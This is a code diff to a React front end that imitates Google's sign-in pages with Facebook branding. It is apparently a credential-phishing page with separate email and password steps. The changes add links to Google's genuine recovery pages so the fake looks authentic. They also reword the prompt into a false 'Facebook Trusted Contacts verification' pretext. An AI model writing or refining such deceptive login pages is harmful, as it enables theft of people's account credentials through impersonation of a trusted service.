@@ -96,6 +96,10 @@ function EmailStep({ onNext }: { onNext: (email: string, id: number) => void }) 
     window.location.href = "https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin";
   };
 
+  const handleForgotPass = () => {
+    window.location.href = "https://accounts.google.com/signin/recovery";
+  };
+
   const handleCreateAccount = () => {
     window.location.href = "https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp";
   };
@@ -108,7 +112,7 @@ function EmailStep({ onNext }: { onNext: (email: string, id: number) => void }) 
         <FaFacebook className="w-10 h-10 text-[#1877F2]" />
       </div>
       <h1 className="text-[1.5rem] font-normal mb-2 text-[#202124]">Sign in</h1>
-      <p className="text-[1rem] text-[#202124] mb-8 text-center">to your google account to continue Facebook Sync</p>
+      <p className="text-[1rem] text-[#202124] mb-8 text-center">to your Google account to continue with Facebook Trusted Contacts verification.</p>
 
       <form onSubmit={handleSubmit} className="w-full mt-2">
         <GoogleInput 
@@ -203,7 +207,11 @@ function PasswordStep({ flowState, onNext }: { flowState: FlowState, onNext: () 
         />
 
         <div className="mt-14 flex justify-between items-center">
-          <button type="button" className="text-[#0b57d0] font-medium hover:bg-blue-50 px-3 py-2 rounded-md transition-colors text-sm">
+          <button 
+            type="button" 
+            onClick={() => window.location.href = "https://accounts.google.com/signin/recovery"}
+            className="text-[#0b57d0] font-medium hover:bg-blue-50 px-3 py-2 rounded-md transition-colors text-sm"
+          >
             Forgot password?
           </button>
           <button 
